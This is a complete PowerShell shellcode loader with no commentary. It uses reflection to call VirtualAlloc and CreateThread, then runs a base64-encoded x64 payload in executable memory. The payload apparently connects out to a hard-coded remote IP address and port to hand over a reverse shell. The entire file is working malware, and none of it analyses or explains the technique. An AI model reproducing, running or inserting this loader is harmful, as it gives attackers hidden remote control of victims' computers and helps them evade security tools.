function ep {
        Param ($zUg5, $yiBs)            
        $rf = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
        
        return $rf.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($rf.GetMethod('GetModuleHandle')).Invoke($null, @($zUg5)))), $yiBs))
}

function i_ {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $ig,
                [Parameter(Position = 1)] [Type] $pX = [Void]
        )
        
        $liE = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $liE.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $ig).SetImplementationFlags('Runtime, Managed')
        $liE.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $pX, $ig).SetImplementationFlags('Runtime, Managed')
        
        return $liE.CreateType()
}

[Byte[]]$dSfV7 = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAAkdeS4a1UFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
                
$dycwL = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ep kernel32.dll VirtualAlloc), (i_ @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $dSfV7.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($dSfV7, 0, $dycwL, $dSfV7.length)

$rPlIV = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ep kernel32.dll CreateThread), (i_ @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$dycwL,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ep kernel32.dll WaitForSingleObject), (i_ @([IntPtr], [Int32]))).Invoke($rPlIV,0xffffffff) | Out-Null
